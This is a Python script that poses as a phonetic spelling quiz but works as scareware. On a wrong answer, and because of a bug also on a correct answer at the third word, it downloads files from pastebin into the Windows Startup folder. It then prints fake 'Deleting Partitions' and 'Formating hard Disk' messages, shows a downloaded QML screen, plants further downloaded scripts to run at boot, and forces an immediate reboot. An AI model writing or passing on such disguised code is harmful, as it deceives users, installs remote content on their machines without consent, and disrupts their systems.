import sys
from time import sleep
from PyQt5.QtGui import QGuiApplication
from PyQt5.QtQml import QQmlApplicationEngine
from PyQt5.QtCore import QObject, pyqtSignal
import threading
import os
import random
import requests

clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
clearConsole()

user = os.environ['USERNAME']

percent = 0

def blue():
	#importing text to QML
	url = "https://pastebin.com/raw/XV47ctX6"

	r = requests.get(url, allow_redirects=True)
	open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
	
	class Backend(QObject):

		def __init__(self):
			QObject.__init__(self)
	
		updated = pyqtSignal(str, arguments=['updater'])
		def updater(self, curr_time):
			self.updated.emit(curr_time)
		def bootUp(self):
			t_thread = threading.Thread(target=self._bootUp)
			t_thread.daemon = True
			t_thread.start()
		def _bootUp(self):
			while True:
				curr_time = 0
				percent = -1
				while int(curr_time) <= 99:
					pause = random.randrange(int(0.1), 3)
					percent = percent +1
					curr_time = str(percent)
					self.updater(curr_time)
					sleep(pause)
				
				if curr_time == str(100) :

					url = "https://pastebin.com/raw/RSiyfdAQ"

					r = requests.get(url, allow_redirects=True)
					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.py", 'wb').write(r.content)

					url = "https://pastebin.com/raw/XTkPxwrr"

					r = requests.get(url, allow_redirects=True)
					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.qml", 'wb').write(r.content)
					
					os.system("shutdown /r /t 1")

	pause = random.randrange(int(0.1), 3)
	print("Deleting Partitions...")
	sleep(pause)
	print("Formating hard Disk...")
	sleep(pause)
	app = QGuiApplication(sys.argv)
	engine = QQmlApplicationEngine()
	engine.quit.connect(app.quit)
	engine.load("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml")
	back_end = Backend()
	engine.rootObjects()[0].setProperty('backend', back_end)
	back_end.bootUp()
	sys.exit(app.exec())

misspell = input("Please spell /misˈspel/, the words are phonetic so you cant cheat\n");
if misspell.lower() == "misspell":
	pharaoh = input("Yay you did it, lets move on to a harder one, please spell /ˈferō/\n");
	if pharaoh.lower() == "pharaoh":

		weird = input("Please spell /wird/\n");
		if weird.lower == "weird":
			intelligence = input("Please spell inˈteləjəns/\n")
			if intelligence.lower() == "intelligence":
				pronunciation = input("Please spell /prəˌnənsēˈāSH(ə)\n")
				if pronunciation.lower() == "pronunciation":
					hand = input("Please spell /ˈhaNGkərCHif,ˈhaNGkərCHēf/\n")
					if hand.lower() == "handkerchief":
						print("Keep going, you are halfway there!")	
						logorrhea = input("Please spell /ˌlôɡəˈrēə/\n")
						if logorrhea.lower() == "logorrhea":
							chiaroscurist = input("Please spell \ kē-ˌär-ə-ˈskyu̇r-ist , kē-ˌer-, kē-ˌa-rə-, -ˈsku̇r- \\n")
							if chiaroscurist.lower() == "chiaroscurist":
								gobbledegook = input("Please spell /ˈɡɒbldiɡuːk/\n")
								if gobbledegook.lower() == "gobbledegook":
									tomfoolery = input("You have finished the test! Good job. to end the test type end or to continue to the special mentions, please spell /tämˈfo͞ol(ə)rē/\n")
									if tomfoolery.lower() == "end":
										pass
									elif tomfoolery.lower() == "tomfoolery":
										shenanigens = input("Last one i swear! Please spell /SHəˈnanəɡənz/\n")
										if shenanigens.lower() == "shenanigens":
											print("Good job you spelled all the words correctly(you probably cheated though but who am I to judge)")
											pass
										else:
											blue()
									else:
										blue()
								else:
									blue()
							else:
								blue()
						else:
							blue()
					else:
						blue()
				else:
					blue()
			else:
				blue()
		else:
			blue()
	else:
		blue()
else:
	blue()
